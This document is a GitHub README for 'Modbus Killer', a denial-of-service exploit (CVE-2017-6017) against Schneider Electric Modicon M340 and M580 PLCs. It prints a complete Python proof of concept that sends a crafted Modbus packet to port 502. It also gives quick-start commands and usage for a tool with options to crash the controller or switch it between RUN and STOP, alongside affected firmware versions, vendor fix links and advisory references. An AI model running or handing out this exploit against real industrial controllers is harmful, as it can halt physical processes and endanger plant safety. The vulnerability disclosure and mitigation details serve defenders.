#  [Tool] Modbus Killer
## [Schneider] Dos Modicon via Modbus Injection

PLC Modicon line ("m340" & "m580") suffer a denial of services upon receiving a simple request to the "modbus" protocol.


	[*] Exploit Title:       "Dos Modicon via Modbus Injection" 
	[*] CVE:                 CVE-2017-6017
	[*] CVSS Base Score v3:  8.6 / 10
	[*] CVSS Vector String:  AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H  
	[*] Date:                2/01/2018
	[*] Vendor:              Schneider Electric
	[*] Devices(tested):     PLC Modicon m340 (v2.0 > v2.8) & modicom m580


![m340](screenshot/m340.png) ![m580](screenshot/m580.jpg)

### Exploit:

```
	import socket 

	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
	client.connect(("192.168.0.101",502)) 
	client.send( "\x44\x62\x00\x00\x00\x06\x00\x5a\x00\x20\x00\x00") 
	client.close()

```

***

## Affected Product(s)

	• M340 CPUs with firmware prior to V2.9
	• M580 CPUs with firmware prior to V2.3
	• Quantum CPUs with firmware prior to V3.52
	• Premium CPUs all versions
	• M1E CPUs all versions

## Tested in:
	
	[+] m430
	BMX P34 2020 v2.0 (TELEMECANIQUE)         
	BMX P34 2020 v2.1                          
	BMX P34 2020 v2.2                          
	...                                        --
	BMX P34 2020 v2.4                          
	BMX P34 2020 v2.5                          
	BMX P34 2020 v2.6                          
	BMX P34 2020 v2.7                           
	BMX P34 2020 v2.8                          

	[+] m580

	BME P58 2020 v01.04
	BME P58 2020 v02.20
	BME P58 4040 v02.20
	BME P58 4040 v02.12


## MITIGATIONS
Schneider Electric has released fixes for the vulnerability that can be downloaded from:

	M340: https://www.schneider-electric.fr/fr/search/V2.9?filters=CAT_PRD_DOC_FIRMUPD
	M580: https://www.schneider-electric.us/en/product-range/62098-modicon-m580-paccontroller/
	Quantum: https://www.schneider-electric.com/en/download/document/OFS_3_50_2905/


# TOOL: "Modbus Killer"

## Quick start

	usr@pwn:~$ git clone https://github.com/ezelf/ics_exploits.git
	usr@pwn:~$ cd ics_exploits/schneider/CVE-2017-6017/
	usr@pwn:~$ python mdKiller.py <host PLC> 

## help

	usage: mdKiller.py [-h] [-v] [--sid SLAVEID] --host HOST [--port PORT]
	                   [--check] [--kill] [--mode {RUN,STOP}]

	[+] DOS Modicon via Modbus Injection. ( CVE-2017-6017 )

	optional arguments:
	  -h, --help         show this help message and exit
	  -v, --version      show program's version number and exit
	  --sid SLAVEID      Slave ID (default 00)
	  --host HOST        Host
	  --port PORT        Port (default 502)
	  --check            Show device info
	  --kill             Check availability
	  --mode {RUN,STOP}  RUN/STOP, PLC

	[+] Demo: mdKiller.py --sid 00 --host <target> --check/kill

***


### RESEARCHER
	Jos Wetzel (Midnight Blue)
	Younes Dragoni (Nozomi Networks) 
	Ezequiel Fernandez  (Dreamlab Technologies)
	Luis Francisco Martin Liras (SUPPRESS group at the University of Léon) 
	Zhang Xiaoming  (CNCERT)
	Zhang Jiawei  (CNCERT)
	Sun Zhonghao  (CNCERT)
	Luo Bing from (CNCERT)

Referencias:
	https://download.schneider-electric.com/files?p_enDocType=Technical+leaflet&p_File_Name=SEVD-2017-048-02_Modicon_Controllers_V3.0.pdf&p_Doc_Ref=SEVD-2017-048-02
	https://www.us-cert.gov/ics/advisories/ICSA-17-054-03
